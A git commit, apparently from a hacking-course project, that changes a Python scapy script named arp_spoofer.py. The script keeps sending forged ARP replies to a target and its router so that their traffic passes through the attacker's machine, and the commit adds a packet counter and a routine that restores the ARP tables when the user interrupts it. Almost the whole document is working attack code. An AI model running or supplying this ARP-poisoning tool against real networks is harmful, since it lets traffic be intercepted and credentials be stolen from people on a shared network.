ffa53c8ba9fa7a02ad5a6b42f1d3d11736faa887
E1Adamov <psnasti@gmail.com>
2019-04-02 06:18:28 -0400

    arp restoration implemented

--- arp_spoofer.py
+++ arp_spoofer.py
@@ -25,11 +25,26 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
+
+
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
 
 
 # keep spoofing as long as we need
-while True:
-    spoof(target, router)
-    spoof(router, target)
-    sleep(2)
+count = 2
+try:
+    while True:
+        print('\r[+] Packets sent:', count, end='')
+        count += 2
+        spoof(target, router)
+        spoof(router, target)
+        sleep(2)
+except KeyboardInterrupt:
+    print('\n[+] Detected CTRL+C... Restoring ARP tables. Please, wait...')
+    restore(target, router)
+    restore(router, target)
